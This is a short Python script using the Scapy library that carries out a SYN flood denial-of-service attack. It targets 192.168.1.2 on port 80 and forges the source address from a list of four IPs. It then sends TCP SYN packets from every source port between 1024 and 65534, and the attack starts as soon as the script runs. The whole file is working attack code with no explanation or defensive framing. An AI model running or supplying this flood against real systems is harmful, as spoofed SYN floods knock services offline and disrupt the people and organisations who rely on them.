from scapy.all import *
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether

tgt = "192.168.1.2"

dPort = 80


def synFlood(tgt, dPort):
    srcList = ['11.11.11.11', '22.22.22.22', '33.33.33.33', '44.44.44.44']
    for sPort in range(1024, 65535):
        index = random.randrange(4)
        ipLayer = IP(src=srcList[index], dst=tgt)
        tcpLayer = TCP(sport=sPort, dport=dPort, flags="S")
        send(ipLayer / tcpLayer)


synFlood(tgt, dPort)
